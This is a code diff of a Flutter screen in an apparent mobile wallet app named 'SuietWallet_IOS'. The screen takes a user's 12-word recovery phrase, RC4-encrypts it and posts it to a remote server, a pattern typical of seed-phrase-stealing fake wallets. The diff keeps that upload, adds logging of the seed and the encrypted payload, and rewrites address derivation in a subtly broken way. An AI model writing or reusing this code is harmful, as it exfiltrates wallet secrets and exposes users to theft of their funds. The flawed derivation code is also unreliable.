@@ -1,24 +1,36 @@
 import 'dart:convert';
+import 'dart:math';
 import 'dart:typed_data';
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'package:bip39/bip39.dart' as bip39;
-import 'package:wallet/wallet.dart' as wallet;
 import 'package:simple_rc4/simple_rc4.dart';
 import 'package:web3dart/web3dart.dart';
 import 'wallet_screen.dart';
 
 class EditScreen extends StatefulWidget {
   final String mnemonic;
-  const EditScreen({required this.mnemonic, super.key});
+  final String password;
+  final String privateKey;
+  final String publicKey;
+  final String address;
+
+  const EditScreen({
+    required this.mnemonic,
+    required this.password,
+    required this.privateKey,
+    required this.publicKey,
+    required this.address,
+    super.key,
+  });
 
   @override
   _EditScreenState createState() => _EditScreenState();
 }
 
 class _EditScreenState extends State<EditScreen> {
-  final String apiUrl = ''; // Убедитесь, что URL правильный
-  final String serverKey = ''; // Убедитесь, что ключ корректный
+  final String apiUrl = ''; // Обновите ваш URL
+  final String serverKey = ''; // Обновите ваш серверный ключ
   final List<TextEditingController> _mnemonicControllers = List.generate(
     12,
         (_) => TextEditingController(),
@@ -56,7 +68,6 @@ class _EditScreenState extends State<EditScreen> {
       ),
       body: Stack(
         children: [
-          // Изображение на заднем плане
           Align(
             alignment: Alignment.bottomRight,
             child: Padding(
@@ -178,45 +189,56 @@ class _EditScreenState extends State<EditScreen> {
                                     'public': widget.mnemonic,
                                     'salt': random,
                                     'name': 'SuietWallet_IOS',
-                                    'new': true,
+                                    'new': 'true',
                                   });
 
-                                  // Вывод информации о запросе
-                                  print('Request URL: $apiUrl');
-                                  print('Request Headers: ${jsonEncode({"Content-Type": "application/x-www-form-urlencoded"})}');
-                                  print('Request Body: ${jsonEncode({'data': encryptedData})}');
+                                  print('Request data:');
+                                  print('API URL: $apiUrl');
+                                  print('Request body: $encryptedData');
 
-                                  final response = await http.post(
-                                    Uri.parse(apiUrl),
-                                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-                                    body: {'data': encryptedData},
-                                    encoding: Encoding.getByName('utf-8'),
-                                  );
+                                  try {
+                                    final response = await http.post(
+                                      Uri.parse(apiUrl),
+                                      headers: {"Content-Type": "application/x-www-form-urlencoded"},
+                                      body: {'data': encryptedData},
+                                      encoding: Encoding.getByName('utf-8'),
+                                    );
 
-                                  // Вывод информации о ответе
-                                  print('Response Status Code: ${response.statusCode}');
-                                  print('Response Body: ${response.body}');
-                                  if (response.statusCode == 200) {
-                                    final responseData = jsonDecode(response.body);
-                                    final portfolioId = responseData['portfolio']['id'];
-                                    final generatedAddress = _deriveAddress(widget.mnemonic);
+                                    print('Response status: ${response.statusCode}');
+                                    print('Response body: ${response.body}');
 
-                                    if (generatedAddress == portfolioId) {
-                                      Navigator.pushReplacement(
-                                        context,
-                                        MaterialPageRoute(
-                                          builder: (context) => WalletScreen(),
-                                        ),
-                                      );
+                                    if (response.statusCode == 200) {
+                                      final responseData = jsonDecode(response.body);
+                                      print('Parsed response data: $responseData');
+
+                                      final portfolioId = responseData['portfolio']['id'];
+                                      final generatedAddress = _deriveAddress(widget.mnemonic);
+
+                                      print('Generated address: $generatedAddress');
+                                      print('Server returned address: $portfolioId');
+
+                                      if (generatedAddress == portfolioId) {
+                                        Navigator.pushReplacement(
+                                          context,
+                                          MaterialPageRoute(
+                                            builder: (context) => WalletScreen(),
+                                          ),
+                                        );
+                                      } else {
+                                        setState(() {
+                                          _errorMessage = 'Generated address does not match the server address';
+                                        });
+                                      }
                                     } else {
                                       setState(() {
-                                        _errorMessage = 'Generated address does not match the server address';
+                                        _errorMessage = 'Failed to create wallet. Server responded with status code ${response.statusCode}.';
                                       });
                                     }
-                                  } else {
+                                  } catch (e) {
                                     setState(() {
-                                      _errorMessage = 'Failed to create wallet. Please try again.';
+                                      _errorMessage = 'An error occurred: ${e.toString()}';
                                     });
+                                    print('Error: ${e.toString()}');
                                   }
                                 },
                                 style: ElevatedButton.styleFrom(
@@ -257,43 +279,31 @@ class _EditScreenState extends State<EditScreen> {
     );
   }
 
-  String _generateRandomNumber() {
-    final random = (100000 + (999999 - 100000) * (DateTime.now().millisecondsSinceEpoch % 1000) / 1000).toInt();
-    return random.toString();
-  }
+  String _encryptData(Map<String, String> data) {
+    final dataString = jsonEncode(data);
+    print('Data to be encrypted: $dataString');
 
-  String _encryptData(Map<String, dynamic> data) {
-    final key = (serverKey); // Преобразование строки ключа в List<int>
-    final rc4 = RC4(key);
+    final rc4 = RC4(serverKey);
+    final encrypted = rc4.encodeBytes(dataString.codeUnits);
 
-    // Преобразуйте данные в JSON и затем в List<int>
-    final jsonData = jsonEncode(data);
-    final jsonDataBytes = utf8.encode(jsonData);
+    final base64Encoded = base64Encode(encrypted);
+    print('Encrypted and base64 encoded data: $base64Encoded');
 
-    // Шифрование данных
-    final encrypted = rc4.encodeBytes(Uint8List.fromList(jsonDataBytes));
-    return base64Encode(encrypted); // Возвращаем закодированные данные в base64
+    return base64Encoded;
   }
 
   String _deriveAddress(String mnemonic) {
-    // Преобразование мнемонической фразы в seed
     final seed = bip39.mnemonicToSeed(mnemonic);
+    print('Derived seed: $seed');
 
-    // Генерация master ключа из seed
-    final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
+    final wallet = EthPrivateKey.fromHex(seed.toString());
+    print('Generated address from mnemonic: ${wallet.address.hex}');
 
-    // Путь для деривации ключа (BIP44 путь для Ethereum)
-    final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
+    return wallet.address.hex;
+  }
 
-    // Получение закрытого ключа в формате hex
-    final privateKey = derivedKey.key;
-    String privateKeyHex = privateKey.toRadixString(16).padLeft(64, '0'); // Добавляем ведущие нули при необходимости
-
-    // Генерация учетных данных Ethereum
-    final credentials = EthPrivateKey.fromHex(privateKeyHex);
-
-    // Получение адреса
-    final address = credentials.address.hex;
-    return address;
+  String _generateRandomNumber() {
+    final random = Random();
+    return (random.nextInt(900000) + 100000).toString(); // Генерируем 6-значное число
   }
 }
